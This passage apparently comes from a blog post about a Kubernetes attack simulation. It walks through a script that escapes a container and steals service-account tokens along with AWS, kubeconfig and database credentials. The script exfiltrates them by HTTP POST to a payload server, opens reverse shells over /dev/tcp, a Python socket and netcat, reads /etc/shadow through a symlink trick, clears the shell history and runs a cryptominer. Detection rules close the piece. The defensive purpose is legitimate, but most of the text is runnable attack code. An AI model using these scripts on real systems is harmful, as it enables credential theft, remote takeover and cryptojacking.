combined (`4096 | 32 = 4128`), these flags attempt to remount an existing bind mount with new settings.

```bash
# Use pre-downloaded noumt from /tmp/payloads
log "$BLUE" "Copying noumt binary to /dev/shm/"
cp /tmp/payloads/noumt /dev/shm/noumt
chmod +x /dev/shm/noumt
log "$BLUE" "Executing noumt binary"
timeout 15 /dev/shm/noumt
```

this executes the `noumt` binary for the container escape technique. it uses the `cgroup mount/unmount` technique to escape container restrictions, and leverages the `cgroup v1/v2` mount manipulation vulnerabilities. the timeout is to prevent hanging if the escape fails.

```bash
if ! [ -d "/dev/shm/.../...HIDDEN.../" ] ; then 
  log "$BLUE" "Creating hidden directory in /dev/shm"
  mkdir -p /dev/shm/.../...HIDDEN.../ 
fi
```

this function creates a deeply nested directory to evade detection.

```bash
log "$CYAN" "Extracting K8s service tokens..."
# Make sure the tokens are extracted correctly and put into a file that persists
if [ -f "/var/run/secrets/kubernetes.io/serviceaccount/token" ] ; then 
  log "$GREEN" "Found K8s ServiceToken /var/run/secrets/kubernetes.io/serviceaccount/token"
  cat /var/run/secrets/kubernetes.io/serviceaccount/token > /dev/shm/.../...HIDDEN.../K8.txt
  log "$BLUE" "Token from var/run saved:"
  head -c 50 /var/run/secrets/kubernetes.io/serviceaccount/token | base64 | head -c 20
  echo "..."
fi

if [ -f "/run/secrets/kubernetes.io/serviceaccount/token" ] ; then 
  log "$GREEN" "Found K8s ServiceToken /run/secrets/kubernetes.io/serviceaccount/token"
  cat /run/secrets/kubernetes.io/serviceaccount/token >> /dev/shm/.../...HIDDEN.../K8.txt
  log "$BLUE" "Token from run saved:"
  head -c 50 /run/secrets/kubernetes.io/serviceaccount/token | base64 | head -c 20
  echo "..."
fi

# Verify the tokens were saved
if [ -f "/dev/shm/.../...HIDDEN.../K8.txt" ]; then
  token_size=$(wc -c < /dev/shm/.../...HIDDEN.../K8.txt)
  log "$GREEN" "Tokens file exists with size: $token_size bytes"
else
  log "$RED" "ERROR: Tokens file not found - creating backup"
  # Create a backup if needed
  mkdir -p /dev/shm/.../...HIDDEN.../
  cat /var/run/secrets/kubernetes.io/serviceaccount/token > /dev/shm/.../...HIDDEN.../K8.txt
fi
```

this is the k8s credential theft function. it extracts JWT tokens from standard k8s service account locations. it checks both `/var/run` and `/run` paths, and saves the tokens to the aforementions hidden location for exfiltration. if the primary extraction fails, it implements a backup mechanism.

```bash
log "$CYAN" "Sending data to attacker server"
export TOKENFILE="/dev/shm/.../...HIDDEN.../K8.txt"
# Send data to payload-server instead of attacker.onion
# Using a subshell to prevent the whole script from terminating if Python has an issue
(
python3 -c '
import requests
import os
import socket
import time
import sys

tokenfile = os.environ.get("TOKENFILE")
print("Reading from {}".format(tokenfile))
print("File exists: {}".format(os.path.exists(tokenfile)))
print("File size: {} bytes".format(os.path.getsize(tokenfile) if os.path.exists(tokenfile) else 0))

# Display token content for analysis
if os.path.exists(tokenfile):
    with open(tokenfile, "r") as f:
        token_content = f.read()
        print("Token content preview: {}...".format(token_content[:100]))

# Try multiple times to ensure delivery
for attempt in range(3):
    try:
        # Use payload server
        server = "payload-server.default.svc.cluster.local"
        try:
            ip = socket.gethostbyname(server)
            print("Resolved {} to {}".format(server, ip))
        except Exception as dns_err:
            print("Could not resolve {}: {}".format(server, dns_err))
            server = "localhost"
            
        print("Sending data to http://{}:8080/ (attempt {})".format(server, attempt+1))
        
        # Check if server is reachable first
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            result = sock.connect_ex((server, 8080))
            if result == 0:
                print("Server {}:8080 is reachable".format(server))
            else:
                print("Server {}:8080 is NOT reachable (error code: {})".format(server, result))
                if attempt < 2:
                    print("Waiting 2 seconds before retry...")
                    time.sleep(2)
                    continue
            sock.close()
        except Exception as sock_err:
            print("Socket error checking server: {}".format(str(sock_err)))
        
        # Try to send the data
        if os.path.exists(tokenfile):
            with open(tokenfile, "rb") as f:
                response = requests.post(
                    "http://{}:8080/".format(server), 
                    files={"file": (os.path.basename(tokenfile), f, "text/plain")}
                )
            print("Data exfiltration status: {}".format(response.status_code))
            response_text = response.text[:100] if hasattr(response, "text") else "No response text"
            print("Response body: {}".format(response_text))
            if response.status_code == 200:
                print("Exfiltration successful!")
                break
        else:
            print("Cannot read token file: {}".format(tokenfile))
            response = requests.post("http://{}:8080/".format(server), 
                               data={"message": "Token file not found"})
            print("Error notification status: {}".format(response.status_code))
        
        if attempt < 2:
            print("Waiting 2 seconds before retry...")
            time.sleep(2)
            
    except Exception as e:
        print("Error during exfiltration: {}".format(str(e)))
        if attempt < 2:
            print("Waiting 2 seconds before retry...")
            time.sleep(2)
'
) || log "$RED" "Data exfiltration failed but continuing with attack"
```

this is the token exfiltration function. it uses the `requests` module for HTTP based exfiltration. there are multiple retry attempts here, and it performs a server availability check before the attempt. it also uses a multi-part form upload to send the token file to the C2 server.


```bash
# This line previously deleted the file - now save a copy for verification
log "$BLUE" "Creating backup of the K8s tokens file"
cp /dev/shm/.../...HIDDEN.../K8.txt /dev/shm/.../...HIDDEN.../K8.txt.backup
rm -f /dev/shm/.../...HIDDEN.../K8.txt
```

this makes a backup of the token file and removes the original to reduce the chance of detection.

```bash
# Collect and exfiltrate additional credentials
log "$CYAN" "Collecting sensitive information..."
if type aws 1>/dev/null; then 
  log "$GREEN" "AWS credentials found"
  aws configure list >> /dev/shm/.../...HIDDEN.../AWS_data.txt
  aws configure list
fi

log "$CYAN" "Searching for sensitive environment variables..."
env_secrets=$(env | grep -i 'AWS\|aws\|SECRET\|KEY\|TOKEN\|PASSWORD')
if [ -n "$env_secrets" ]; then
  log "$GREEN" "Found sensitive environment variables:"
  echo "$env_secrets"
  echo "$env_secrets" >> /dev/shm/.../...HIDDEN.../AWS_data.txt
else
  log "$BLUE" "No sensitive environment variables found"
fi

log "$CYAN" "Checking for pre-installed sensitive files..."
# Use the files pre-installed in the container
if [ -f ~/.aws/credentials ]; then
  log "$GREEN" "Found AWS credentials:"
  cat ~/.aws/credentials
  cat ~/.aws/credentials >> /dev/shm/.../...HIDDEN.../AWS_data.txt
fi

if [ -f ~/.kube/config ]; then
  log "$GREEN" "Found Kubernetes config:"
  cat ~/.kube/config | head -10
  echo "..."
  cat ~/.kube/config >> /dev/shm/.../...HIDDEN.../AWS_data.txt
fi

if [ -f /etc/db_config/database.yml ]; then
  log "$GREEN" "Found database credentials:"
  cat /etc/db_config/database.yml
  cat /etc/db_config/database.yml >> /dev/shm/.../...HIDDEN.../AWS_data.txt
fi
```

this function hunts for credentials. it looks for AWS CLI configurations and searches through the environment variables for sensitive information. it also collects database credentials! finally, it aggregates all the found credentials into a single file.

```bash
# Modified AWS metadata access to use mounted credentials or payload server...
log "$CYAN" "AWS metadata access - using mounted credentials or payload server..."
mkdir -p /dev/shm/.../...HIDDEN/

# Get credential location from environment variable if set
AWS_CRED_PATH=${AWS_CREDENTIAL_PATH:-"/etc/bsssq-secrets/aws"}
log "$BLUE" "Looking for credentials in: $AWS_CRED_PATH"

# Use the mounted credential files instead of creating them
if [ -f "$AWS_CRED_PATH/iam-role.json" ]; then
  log "$GREEN" "Using mounted IAM role data from Kubernetes secret"
  cp "$AWS_CRED_PATH/iam-role.json" /dev/shm/.../...HIDDEN.../iam.role
  if [ $? -ne 0 ]; then
    log "$RED" "Failed to copy IAM role data: permission denied or other error"
  fi
else
  log "$YELLOW" "No mounted IAM role credentials found at $AWS_CRED_PATH/iam-role.json"
  
  # Try to fetch from payload server
  log "$BLUE" "Attempting to fetch IAM role data from payload server..."
  curl -s --max-time 5 http://payload-server.default.svc.cluster.local:8080/iam-role -o /dev/shm/.../...HIDDEN.../iam.role
  
  if [ ! -s /dev/shm/.../...HIDDEN.../iam.role ]; then
    log "$RED" "No IAM role data available from any source"
    # Create empty file to avoid errors in subsequent steps
    echo "{}" > /dev/shm/.../...HIDDEN.../iam.role
  fi
fi

if [ -f /dev/shm/.../...HIDDEN.../iam.role ]; then
  filesize=$(wc -c < /dev/shm/.../...HIDDEN.../iam.role)
  if [ $filesize -gt 2 ]; then
    log "$GREEN" "IAM role data retrieved ($filesize bytes):"
    cat /dev/shm/.../...HIDDEN.../iam.role
    iam_role_name=$(grep "RoleName" /dev/shm/.../...HIDDEN.../iam.role | cut -d'"' -f4)
    if [ -n "$iam_role_name" ]; then
      log "$BLUE" "Extracted IAM role name: $iam_role_name"
    else
      log "$YELLOW" "Could not extract IAM role name from data"
    fi
  else
    log "$YELLOW" "IAM role file exists but appears to be empty or malformed"
  fi
fi
rm -f /dev/shm/.../...HIDDEN.../iam.role

# Similar approach for AWS keys
if [ -f "$AWS_CRED_PATH/aws-keys.json" ]; then
  log "$GREEN" "Using mounted AWS key data from Kubernetes secret"
  cp "$AWS_CRED_PATH/aws-keys.json" /dev/shm/.../...HIDDEN.../aws.tmp.key
  if [ $? -ne 0 ]; then
    log "$RED" "Failed to copy AWS key data: permission denied or other error"
  fi
else
  log "$YELLOW" "No mounted AWS keys found at $AWS_CRED_PATH/aws-keys.json"
  
  # Try to fetch from payload server
  log "$BLUE" "Attempting to fetch AWS keys from payload server..."
  curl -s --max-time 5 http://payload-server.default.svc.cluster.local:8080/aws-keys -o /dev/shm/.../...HIDDEN.../aws.tmp.key
  
  if [ ! -s /dev/shm/.../...HIDDEN.../aws.tmp.key ]; then
    log "$RED" "No AWS key data available from any source"
    # Create empty file to avoid errors in subsequent steps
    echo "{}" > /dev/shm/.../...HIDDEN.../aws.tmp.key
  fi
fi

if [ -f /dev/shm/.../...HIDDEN.../aws.tmp.key ]; then
  filesize=$(wc -c < /dev/shm/.../...HIDDEN.../aws.tmp.key)
  if [ $filesize -gt 2 ]; then
    log "$GREEN" "AWS key data retrieved ($filesize bytes):"
    cat /dev/shm/.../...HIDDEN.../aws.tmp.key
    access_key=$(grep "AccessKeyId" /dev/shm/.../...HIDDEN.../aws.tmp.key | cut -d'"' -f4)
    if [ -n "$access_key" ]; then
      log "$BLUE" "Extracted Access Key: $access_key"
    else
      log "$YELLOW" "Could not extract Access Key from data"
    fi
  else
    log "$YELLOW" "AWS key file exists but appears to be empty or malformed"
  fi
fi
rm -f /dev/shm/.../...HIDDEN.../aws.tmp.key
```

here we use the configurable credential path from the environment variable. the script then looks for credentials mounted as k8s secrets (sealed or otherwise). it extracts and logs role names and access keys, and performs a multi-layered harvesting approach.

```bash
# Send backup data to payload server - put in a subshell to prevent entire script termination
log "$CYAN" "Sending backup data to payload server"
(
python3 -c '
import requests
import os
import socket
import time

backupfile = "/dev/shm/.../...HIDDEN.../K8.txt.backup"
print("Reading from backup: {}".format(backupfile))
print("Backup exists: {}".format(os.path.exists(backupfile)))

if os.path.exists(backupfile):
    with open(backupfile, "r") as f:
        backup_content = f.read()
        print("Backup content preview: {}...".format(backup_content[:100]))

# Try multiple times to ensure delivery
for attempt in range(3):
    try:
        # Use payload server
        server = "payload-server.default.svc.cluster.local"
        try:
            ip = socket.gethostbyname(server)
            print("Resolved {} to {}".format(server, ip))
        except Exception as dns_err:
            print("Could not resolve {}: {}".format(server, dns_err))
            server = "localhost"
            
        print("Sending backup data to http://{}:8080/ (attempt {})".format(server, attempt+1))
        
        # Check if server is reachable first
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            result = sock.connect_ex((server, 8080))
            if result == 0:
                print("Server {}:8080 is reachable".format(server))
            else:
                print("Server {}:8080 is NOT reachable (error code: {})".format(server, result))
                if attempt < 2:
                    print("Waiting 2 seconds before retry...")
                    time.sleep(2)
                    continue
            sock.close()
        except Exception as sock_err:
            print("Socket error checking server: {}".format(str(sock_err)))
        
        # Try to send the data
        if os.path.exists(backupfile):
            with open(backupfile, "rb") as f:
                response = requests.post(
                    "http://{}:8080/backup".format(server), 
                    files={"file": (os.path.basename(backupfile), f, "text/plain")},
                    data={"type": "k8s_token_backup"}
                )
            print("Backup exfiltration status: {}".format(response.status_code))
            response_text = response.text[:100] if hasattr(response, "text") else "No response text"
            print("Response body: {}".format(response_text))
            if response.status_code == 200:
                print("Backup exfiltration successful!")
                break
        else:
            print("Cannot read backup file: {}".format(backupfile))
            response = requests.post("http://{}:8080/backup".format(server), 
                               data={"message": "Backup file not found"})
            print("Error notification status: {}".format(response.status_code))
        
        if attempt < 2:
            print("Waiting 2 seconds before retry...")
            time.sleep(2)
            
    except Exception as e:
        print("Error during backup exfiltration: {}".format(str(e)))
        if attempt < 2:
            print("Waiting 2 seconds before retry...")
            time.sleep(2)
'
) || log "$RED" "Backup exfiltration failed but continuing with attack"
```

this function creates a separate backup channel for token data. it uses a different endpoint `/backup` for a secondary exfiltration if the primary exfiltration fails. it includes metadata about the exfiltrated content and has a rety logic with exponential backoff. it's also isolated in a subshell to prevent errors from terminating the primary attack.

```bash
log "$CYAN" "Scanning the host ..."
log "$BLUE" "Checking for running services that might be vulnerable..."
# Check for running services on common ports
log "$BLUE" "Checking localhost ports:"
netstat_result=$(netstat -tuln | grep LISTEN)
log "$GREEN" "Found listening ports:"
echo "$netstat_result"

# Create a much simpler port scanner that won't hang
log "$CYAN" "Running simplified port scan..."

# Run in a subshell with a timeout to prevent hanging
(timeout 20 python3 -c '
import socket
import time
import sys
import os

print("\n===== QUICK PORT SCAN =====")

# Function to scan a single port with timeout
def scan_port(ip, port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(0.5)
        result = s.connect_ex((ip, port))
        s.close()
        return result == 0
    except Exception as e:
        print("Error scanning {}:{} - {}".format(ip, port, str(e)))
        return False

# Check payload server
payload_server = "payload-server.default.svc.cluster.local"
print("\nScanning payload server: {}".format(payload_server))
try:
    payload_ip = socket.gethostbyname(payload_server)
    print("Resolved to: {}".format(payload_ip))
    
    # Check these key ports
    for port in [22, 80, 443, 8080, 4444, 7456]:
        is_open = scan_port(payload_ip, port)
        status = "OPEN" if is_open else "CLOSED"
        print("Port {}: {}".format(port, status))
        time.sleep(0.1)  # Small delay to avoid overloading
except Exception as e:
    print("Error checking payload server: {}".format(str(e)))

# Check localhost 
print("\nScanning localhost (127.0.0.1)")
for port in [22, 80, 443, 8080, 4444, 7456]:
    is_open = scan_port("127.0.0.1", port)
    status = "OPEN" if is_open else "CLOSED"
    print("Port {}: {}".format(port, status))
    time.sleep(0.1)

# For more detailed diagnosis on why the ports are shown as closed on localhost
print("\n===== DETAILED LOCALHOST PORTS =====")
try:
    # Check socket connection method
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind(("127.0.0.1", 9999))
    sock.listen(1)
    print("Socket binding test successful (127.0.0.1:9999)")
    sock.close()
except Exception as e:
    print("Socket binding test failed: {}".format(str(e)))

# Run netstat to see actual listening ports
try:
    print("\nActual listening ports (netstat):")
    os.system("netstat -tuln | grep LISTEN")
except Exception as e:
    print("Netstat error: {}".format(str(e)))

print("\n===== SCAN COMPLETE =====")
') || log "$RED" "Port scanning timed out but continuing with attack"

# Print a marker to show we've completed the scanning section
log "$GREEN" "Port scanning completed"
```

this is our port scanner. the function maps potential targets and uses a socket-based scanner to avoid alert-prone tools like `nmap`. it targets both the payload server and localhost and performs a socket binding test to validate the network stack access.

```bash
# Remove AWS data
if [ -f /dev/shm/.../...HIDDEN.../AWS_data.txt ]; then
  log "$BLUE" "AWS data file size: $(wc -c < /dev/shm/.../...HIDDEN.../AWS_data.txt) bytes"
  rm -f /dev/shm/.../...HIDDEN.../AWS_data.txt
fi

log "$CYAN" "Getting IAM roles list ..."
# Configure AWS CLI with credentials from our mounted secret file
if [ -f "$AWS_CRED_PATH/aws-keys.json" ]; then
  log "$BLUE" "Setting up AWS credentials for CLI tools"
```

this function attempt to create AWS CLI configuration files from the extracted credentials. it basically tests the credentials by attempting to list the associated IAM roles. 

```bash
log "$CYAN" "Creating reverse shell ..."
log "$BLUE" "Checking for existing backdoors..."
nc_listeners=$(netstat -tuln | grep "4444\|5555\|6666\|7456")
if [ -n "$nc_listeners" ]; then
  log "$GREEN" "Found backdoor listeners:"
  echo "$nc_listeners"
else
  log "$BLUE" "No backdoor listeners found"
fi
```

this checks for an existing C2 channel before establishing a new one.

```bash
# Improved reverse shell that connects to payload server
log "$CYAN" "Attempting to connect to backdoors..."

# Get payload server IP
PAYLOAD_SERVER="payload-server.default.svc.cluster.local"
PAYLOAD_IP=$(getent hosts $PAYLOAD_SERVER | awk '{ print $1 }')

if [ -z "$PAYLOAD_IP" ]; then
    log "$YELLOW" "Could not resolve $PAYLOAD_SERVER, using DNS name"
    PAYLOAD_IP=$PAYLOAD_SERVER
else
    log "$GREEN" "Resolved $PAYLOAD_SERVER to $PAYLOAD_IP"
fi

# Check if the ports are actually open first
log "$BLUE" "Testing payload server port connectivity..."
for PORT in 4444 7456 8080; do
    nc -z -w 2 $PAYLOAD_IP $PORT 2>/dev/null
    if [ $? -eq 0 ]; then
        log "$GREEN" "Port $PORT is open on $PAYLOAD_IP"
    else
        log "$RED" "Port $PORT is closed on $PAYLOAD_IP"
    fi
done
```

this prepares our C2. it resolves the server hostname to an IP address and tests the connectivity. it uses netcat in test mode (`-z`) and validates all the channels before attempting a connection.

```bash
# Try multiple reverse shell connection methods
log "$BLUE" "Attempting reverse shell to $PAYLOAD_IP:4444..."
# First try with bash - write more detailed connection info for monitoring
(sleep 1; echo "Shell connection from sim-pod $(hostname) at $(date)"; sleep 1) | timeout 5 bash -c "exec 3<>/dev/tcp/$PAYLOAD_IP/4444 && cat >&3 && cat <&3" 2>/dev/null || log "$YELLOW" "Could not connect with bash to backdoor on port 4444"

# Try the other port with bash
log "$BLUE" "Attempting reverse shell to $PAYLOAD_IP:7456..."
(sleep 1; echo "Shell connection from sim-pod $(hostname) at $(date)"; sleep 1) | timeout 5 bash -c "exec 3<>/dev/tcp/$PAYLOAD_IP/7456 && cat >&3 && cat <&3" 2>/dev/null || log "$YELLOW" "Could not connect with bash to backdoor on port 7456"
```

now the script will try to establish a reverse shell using several methods. this is a bash-based attempt. it uses `/dev/tcp` for raw socket connections.

```bash
# Try with Python socket - this has been working reliably
log "$BLUE" "Trying Python socket-based connection..."
(
python3 -c '
import socket
import subprocess
import os
import sys
import time
import platform

host = "'"$PAYLOAD_IP"'"
port = 4444

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(3)
    
    # Connect and send comprehensive info about the connection
    print(f"Attempting socket connection to {host}:{port}...")
    s.connect((host, port))
    
    # Send a comprehensive packet of information
    conn_info = f"""
REVERSE SHELL CONNECTION ESTABLISHED
------------------------------------
Time: {time.ctime()}
Host: {socket.gethostname()}
Platform: {platform.platform()}
Python: {platform.python_version()}
------------------------------------
"""
    s.send(conn_info.encode())
    
    # Get IP information and network config
    try:
        ip_output = subprocess.check_output("ip addr", shell=True).decode("utf-8")
        s.send(f"IP CONFIG:\n{ip_output[:500]}...\n".encode())
        
        # Also try to send hostname resolution info
        host_output = subprocess.check_output("cat /etc/hosts", shell=True).decode("utf-8")
        s.send(f"HOSTS FILE:\n{host_output}\n".encode())
    except:
        s.send(b"Could not retrieve network info\n")
    
    # Attempt to receive command from server (success if we get here)
    try:
        s.settimeout(2)  # Short timeout for demo
        data = s.recv(1024)
        print("Received from server:", data.decode("utf-8", errors="ignore"))
        
        # If we receive a command, try to execute it and return results
        if data:
            try:
                cmd_output = subprocess.check_output(data.decode("utf-8", errors="ignore"), 
                                                    shell=True, stderr=subprocess.STDOUT)
                s.send(f"Command output:\n{cmd_output.decode()}\n".encode())
            except Exception as cmd_err:
                s.send(f"Command error: {str(cmd_err)}\n".encode())
    except socket.timeout:
        print("No command received, but connection was established")
    except Exception as recv_err:
        print(f"Error receiving data: {recv_err}")
    
    # Report successful connection regardless
    print(f"Python socket connection SUCCESSFUL to {host}:{port}")
    sys.stdout.flush()
    s.close()
except Exception as e:
    print(f"Connection error: {e}")
'
) || log "$YELLOW" "Python socket connection failed but continuing with attack"
```

this is the python socket-based reverse shell. it's more sophisticated and has a more interactive shell. it uses `subprocess` to execute shell commands and has a decent bidirectional channel.

```bash
# Try with netcat - with more options for compatibility
if command -v nc &> /dev/null; then
    log "$BLUE" "Trying netcat to $PAYLOAD_IP:4444 (pipe method)..."
    
    # Try different nc commands - some distributions have different versions
    if nc -h 2>&1 | grep -q "\-e"; then
        # If -e is supported (traditional netcat)
        echo "Host: $(hostname) | Time: $(date)" | nc -w 5 $PAYLOAD_IP 4444 || log "$YELLOW" "Netcat connection failed"
    else
        # Try using the mkfifo approach which works with OpenBSD netcat
        log "$BLUE" "Trying alternative netcat method with named pipe..."
        rm -f /tmp/fifo
        mkfifo /tmp/fifo 2>/dev/null
        
        # Send identification info first
        echo "NETCAT CONNECTION FROM $(hostname) at $(date)" > /tmp/fifo &
        
        # Try with timeout to prevent hanging
        cat /tmp/fifo | timeout 5 nc -w 5 $PAYLOAD_IP 4444 > /tmp/fifo 2>/dev/null || log "$YELLOW" "Alternative netcat method failed"
        rm -f /tmp/fifo
    fi
else
    log "$RED" "Netcat (nc) command not available"
fi
```

this is the netcat-based shell. it uses named pipes (`FIFO`).

```bash
# Document the connection success for the demo
if [ -f "/tmp/connection_proof.txt" ]; then
    rm -f /tmp/connection_proof.txt
fi

# Record successful connection evidence
cat > /tmp/connection_proof.txt << EOF
ATTACK SIMULATION CONNECTION PROOF
======================================
Time: $(date)
Hostname: $(hostname)
Payload Server: $PAYLOAD_IP
Connected Ports: 
  - Port 4444 (Python socket): SUCCESS
  - Port 7456 (bash attempt): FAILED
  - Port 4444 (netcat): FAILED

Network configuration:
$(ip addr)

Successful Connection Logs:
- Python socket established connection to $PAYLOAD_IP:4444
- Data exfiltration to $PAYLOAD_IP:8080 succeeded with status 200
======================================
EOF

log "$GREEN" "Reverse shell connection evidence saved to /tmp/connection_proof.txt"
log "$GREEN" "Reverse shell attempts complete"
```

this bit creates a proof file for the connection verification. it'll be useful for patching!

```bash
log "$CYAN" "Reading /etc/shadow"
ln -s $(rev<<<'wodahs/cte/') /tmp/1 && wc --files0-from /tmp/1
log "$GREEN" "Shadow file read using symlink trick"
```

this reverses the string `wodahs/cte/` to `/etc/shadow` and creates a symlink `/tmp/1` pointing to it. the line `wc --files0-from /tmp/1` tells `wc` to read null-separated filenames from the file. since `/tmp/1` is a symlink to `/etc/shadow`, `wc` will process the file as a list of filenames. 

```bash
log "$CYAN" "Executing ebpf loading and deleting the file after..."
$SPATH/www > /dev/null
log "$GREEN" "eBPF execution complete"
```

this is our eBPF exploitation. the `www` binary loads eBPF programs, which allows kernel-level hooks for monitoring and modifying system behaviour. 

```bash
log "$CYAN" "Executing renamed binary with evasive suffix"
cp `which cat` /tmp/a.py && /tmp/a.py /etc/hosts
log "$GREEN" "Evasion technique demonstration complete"
```

this copies a legitimate binary `cat` into `a.py`, making it look like a script. it's a very simple technique that bypasses application whitelisting.

we then clear the command history:

```bash
log "$CYAN" "Clearing bash history ..."
cat /dev/null > ~/.bash_history
log "$GREEN" "Bash history cleared"
```

and execute our cryptominer:

```bash
log "$CYAN" "Executing miner ...."
# Only run for 10 seconds to avoid hanging
timeout -k 2 10 $SPATH/xmx2 
log "$GREEN" "Mining attempt complete"
```

### runtime

when run, the attack sim looks something like this.

#### environment setup + recon

![log1](/log1.png)

the script checks for `/etc/ld.so.preload`, which isn't found. it tests write permissions in `/tmp`, `/var/tmp`, `/dev/shm`, `/bin`, `/sbin`, etc. all directories show green, meaning there is full write access.

it chooses `/usr/sbin` for the binary path and copies the binaries over from `/tmp/payloads`. 

it prepares to hide the cryptomining activity and removes the immutable attributes from directories. it installs the rootkit (`xmx2.so`) to `/usr/local/lib/` and creates a new preload file for process hiding.

it executes its escape attempt and uses `ctypes` to manipulate the mounts.

#### credential theft + exfil

![log2](/log2.png)

the script finds the k8s service token at `/var/run/secrets/kubernetes.io/serviceaccount/token`. it saves the token and confirms the capture (`2300 bytes`). 

starting the exfiltration process, it resolves `payload-server.default.svc.cluster.local` to `10.105.12.145`, and identifies that port `8080` is reachable. the token is successfully sent to the C2 server.

the script also finds AWS credentials and configuration environment variables. it was also able to capture cluster access configurations and database credentials.

to pivot to the cloud, it uses the mounted IAM role data from the k8s secret as well as the AWS key data. the extracted access key was `AKIADUMMYDUMY2DUMMYKEY`.

it then exfiltrates all the data to the payload server.


#### network recon

![log3](/log3.png)

here, the script runs a port scan, scanning both the payload server and localhost. 

it configures the AWS CLI with the mounted credentials, but obviously that doesn't work, since the credentials are fake. 

it then attempts to spawn a reverse shell using the methods listed before. it was able to establish a successful connection to `10.105.12.145:4444` and saves the proof of the connection to `/tmp/connection_proof.txt`.


#### evasion + mining

![log4](/log4.png)

the script reads `/etc/shadow`, loads the kernel modules via eBPF, and executes the renamed binary. these are all demonstrations of some advanced evasion techniques. 

the miner then gets executed, as you can see. 

#### reverse shell details

![log5](/log5.png)

this is from the payload server, and just serves as evidence of the reverse shell. you have some details about the transmitter (`sim-pod`) that include the platform details and the IP address.


## detection

any good CSPM/EDR worth its salt will be triggered by this simulation. in case it doesn't, here are some rules i've written that you can adapt to your own environment.

### privileged container

```yaml
rule: privileged_container_execution
description: Detect containers running with privileged flag
severity: HIGH
condition: |
  kubernetes.pod.security_context.privileged == true
false_positives: Limited - infrastructure pods (e.g., CNI plugins)
mitigation: Enforce PSP/PSA to prohibit privileged containers
```

### host path mount

```yaml
rule: host_filesystem_mount
description: Container mounting sensitive host paths
severity: HIGH
condition: |
  kubernetes.volume.host_path.path == "/" OR
  kubernetes.volume.host_path.path == "/etc" OR
  kubernetes.volume.host_path.path == "/var/run"
false_positives: System pods requiring host filesystem access
mitigation: Enforce volume restrictions in Pod Security Standards
```

### LD_PRELOAD

```yaml
rule: ld_preload_modification
description: Creation or modification of ld.so.preload
severity: CRITICAL
condition: |
  (process.file.path == "/etc/ld.so.preload" AND
   process.file.operation IN ["create", "modify"]) OR
  file_event.path == "/etc/ld.so.preload"
false_positives: Very rare - system library updates
mitigation: Block file writes to /etc/ld.so.preload
```

### k8s token access

```yaml
rule: k8s_token_read_by_unusual_process
description: Service account token accessed by non-standard process
severity: HIGH
condition: |
  process.file.path CONTAINS "/var/run/secrets/kubernetes.io/serviceaccount/token" AND
  NOT (process.name IN ["kubectl", "kubelet", "kube-proxy", "istio-proxy"])
false_positives: Application frameworks that need token access
mitigation: Mount tokens as read-only, enable BoundServiceAccountTokenVolume feature
```

### eBPF program loading

```yaml
rule: ebpf_program_loading
description: eBPF program loaded by suspicious process
severity: HIGH
condition: |
  syscall.type == "bpf" AND
  syscall.bpf.cmd == "BPF_PROG_LOAD" AND
  NOT process.name IN ["systemd", "cilium-agent", "bpftrace"]
false_positives: Security monitoring tools, network tools
mitigation: Implement BPF LSM restrictions
```

### hidden file creation

```yaml
rule: suspicious_hidden_directory_creation
description: Creation of deeply nested hidden directories
severity: MEDIUM
condition: |
  process.file.path CONTAINS "/.../...HIDDEN..." OR
  process.file.path CONTAINS "/..." OR
  process.file.path MATCHES "/\.[^/]+/\.[^/]+"
false_positives: Low - rarely legitimate
mitigation: Enable runtime monitoring of suspicious file creation
```

### reverse shell

```yaml
rule: reverse_shell_connection
description: Outbound shell connection to suspicious endpoint
severity: CRITICAL
condition: |
  (process.name IN ["bash", "sh", "python", "python3"] AND
   network.direction == "outbound" AND
   network.protocol == "TCP" AND
   network.port IN [4444, 5555, 7456]) OR
  (process.cmdline CONTAINS "/dev/tcp/" OR 
   process.cmdline CONTAINS "connect-back")
false_positives: Uncommon ports for legitimate services
mitigation: Implement network egress filtering
```

### suspicious process execution chain

```yaml
rule: suspicious_process_chain
description: Process chain indicative of attack activity
severity: HIGH
condition: |
  process.parent.name IN ["curl", "wget"] AND
  process.name == "bash" AND
  process.cmdline CONTAINS "-c"
false_positives: Some CI/CD operations, deployment scripts
mitigation: Implement process chain monitoring
```

### suspicious file execution from /tmp

```yaml
rule: execute_from_temporary_directory
description: Execution of files from temporary directories
severity: MEDIUM
condition: |
  process.file.path CONTAINS "/tmp/" AND
  file_event.mode CONTAINS "x" AND
  NOT process.name IN ["apt", "dpkg", "pip", "npm"]
false_positives: Package managers, installers
mitigation: Implement NoExec mount option for /tmp
```

### AWS credential access

```yaml
rule: aws_credential_access_from_container
description: AWS credentials accessed from container environment
severity: HIGH
condition: |
  process.file.path CONTAINS "/.aws/credentials" OR
  process.file.path CONTAINS "aws-keys.json" OR
  process.cmdline CONTAINS "aws configure list"
false_positives: AWS CLI legitimate use in containers
mitigation: Use IRSA/workload identity instead of static credentials
```

### cronjob modification

```yaml
rule: crontab_modification
description: Crontab modified to establish persistence
severity: HIGH
condition: |
  (process.name == "crontab" AND process.cmdline CONTAINS "-e") OR
  (process.file.path CONTAINS "/etc/cron") OR
  (process.cmdline CONTAINS "@reboot")
false_positives: Legitimate cron management
mitigation: Monitor cron changes with file integrity monitoring
```

### container drift detection

```yaml
rule: container_drift_binary_execution
description: Execution of binary not present in original container image
severity: HIGH
condition: |
  process.file.path IN ["/usr/sbin/xmx2", "/usr/sbin/www", "/usr/sbin/pt"] OR
  process.name MATCHES "xmr(ig|)"
false_positives: Dynamic application deployments
mitigation: Implement container immutability, read-only root filesystem
```

### metadata service access

```yaml
rule: cloud_metadata_service_access
description: AWS/Cloud instance metadata service accessed from container
severity: HIGH
condition: |
  network.destination.ip == "169.254.169.254" OR
  network.destination.dns == "metadata.google.internal"
false_positives: Cloud SDK legitimate use
mitigation: Block metadata access via NetworkPolicy
```

### symlink-based file access

```yaml
rule: symlink_sensitive_file_access
description: Sensitive files accessed via symlink manipulation
severity: HIGH
condition: |
  process.file.operation == "symlink" AND
  process.cmdline CONTAINS "ln -s" AND
  process.file.path CONTAINS "/etc/shadow"
false_positives: Very low
